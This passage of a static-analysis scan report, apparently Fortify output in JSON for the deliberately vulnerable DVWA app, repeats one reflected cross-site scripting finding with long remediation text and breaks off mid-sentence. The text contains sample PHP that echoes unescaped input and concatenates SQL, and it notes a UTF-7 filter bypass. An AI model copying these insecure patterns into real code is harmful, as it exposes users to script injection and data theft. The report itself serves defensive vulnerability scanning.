            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 435.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4457/?engineType=SCA&issue=3E768A1E5391AB41F00609EA37388328"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4483",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 435 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 435.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4483/?engineType=SCA&issue=537198DA98652DCF4B42BD84465F1CE6"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4619",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 435 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 435.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4619/?engineType=SCA&issue=9E81BA00D7AAE4C892EB58265636147C"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4683",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 435 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 435.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, 